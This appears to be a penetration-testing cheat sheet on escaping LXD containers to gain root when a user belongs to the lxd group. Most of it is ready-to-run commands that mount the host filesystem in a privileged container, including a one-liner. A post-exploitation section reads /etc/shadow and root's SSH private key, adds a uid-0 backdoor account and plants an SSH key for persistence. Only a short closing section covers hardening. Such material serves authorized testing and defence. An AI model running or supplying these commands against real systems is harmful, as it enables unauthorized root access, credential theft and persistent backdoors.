# 🐳 LXD Container Escape

## 🎯 Overview

LXD (Linux Daemon) container manager can be exploited for privilege escalation when user is member of `lxd` group through privileged container creation and host filesystem mounting.

## 🔍 Prerequisites

### Check LXD Group Membership
```bash
# Check if user is in lxd group
id | grep lxd
groups | grep lxd

# Example output:
# uid=1000(user) gid=1000(user) groups=1000(user),116(lxd)
```

## 🚀 Exploitation Methods

### Method 1: Existing Container Image
```bash
# List available images
lxc image list

# If image exists, create privileged container
lxc init image_name privesc -c security.privileged=true
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
lxc start privesc
lxc exec privesc /bin/bash

# Access host filesystem as root
cd /mnt/root/root
```

### Method 2: Import Custom Image
```bash
# If ubuntu-template.tar.xz or similar exists
lxc image import ubuntu-template.tar.xz --alias ubuntutemp

# Create privileged container
lxc init ubuntutemp privesc -c security.privileged=true
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
lxc start privesc
lxc exec privesc /bin/bash

# Root access to host filesystem
ls -la /mnt/root/
```

### Method 3: Build Alpine Image (if needed)
```bash
# Download Alpine image
wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine
chmod +x build-alpine
sudo ./build-alpine

# Import and use
lxc image import alpine*.tar.gz --alias alpine
lxc init alpine privesc -c security.privileged=true
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
lxc start privesc  
lxc exec privesc /bin/sh
```

## 🔧 LXD Initialization

### First-time Setup
```bash
# Initialize LXD (if not already done)
lxd init

# Use defaults for all prompts:
# - Storage pool: yes (dir)
# - Network: no
# - Bridge: yes (may fail, but proceed)
```

## 🎯 Post-Exploitation

### Host System Access
```bash
# Inside privileged container
cd /mnt/root

# Access host root directory
cd /mnt/root/root

# Read sensitive files
cat /mnt/root/etc/shadow
cat /mnt/root/root/.ssh/id_rsa

# Create backdoor user on host
echo 'backdoor:$6$salt$hash:0:0:root:/root:/bin/bash' >> /mnt/root/etc/passwd

# Add SSH key for persistence
mkdir -p /mnt/root/root/.ssh
echo "ssh-rsa AAAA..." >> /mnt/root/root/.ssh/authorized_keys
```

## 🔍 Detection & Enumeration

### Quick LXD Check Script
```bash
#!/bin/bash
echo "=== LXD PRIVILEGE ESCALATION CHECK ==="

echo "[+] LXD group membership:"
id | grep lxd && echo "  [!] User is in lxd group!"

echo "[+] Available LXC images:"
lxc image list 2>/dev/null

echo "[+] Existing containers:"
lxc list 2>/dev/null

echo "[+] LXD service status:"
systemctl status lxd 2>/dev/null

echo "[+] Container templates in current directory:"
ls -la *.tar.* 2>/dev/null
```

### LXD Service Check
```bash
# Check if LXD is running
systemctl status lxd
ps aux | grep lxd

# Check LXD socket
ls -la /var/lib/lxd/
ls -la /var/snap/lxd/
```

## 🔑 Quick Reference

### Immediate Checks
```bash
# Group membership
id | grep lxd

# Available resources
lxc image list
lxc list
ls -la *.tar.*  # Local container images
```

### Emergency Escalation
```bash
# If LXD group confirmed and image available
lxc init image_name root -c security.privileged=true
lxc config device add root host disk source=/ path=/mnt/root recursive=true
lxc start root
lxc exec root /bin/bash
cd /mnt/root/root
```

### One-liner Escalation
```bash
# Complete LXD escalation (if alpine image exists)
lxc init alpine pwn -c security.privileged=true && lxc config device add pwn host disk source=/ path=/mnt/root recursive=true && lxc start pwn && lxc exec pwn /bin/sh && cd /mnt/root
```

## ⚠️ Defensive Considerations

### LXD Security Issues
- **Group membership** automatically grants container privileges
- **Privileged containers** bypass security isolation
- **Host filesystem access** via device mounting
- **No password required** for lxd group members

### Hardening Recommendations
```bash
# Remove users from lxd group
sudo deluser username lxd

# Disable LXD service if not needed
sudo systemctl disable lxd
sudo systemctl stop lxd

# Monitor LXD usage
journalctl -u lxd
```

---

*LXD group membership provides a direct path to root privileges through privileged container creation - the isolation boundary disappears when containers can mount the host filesystem with root access.* 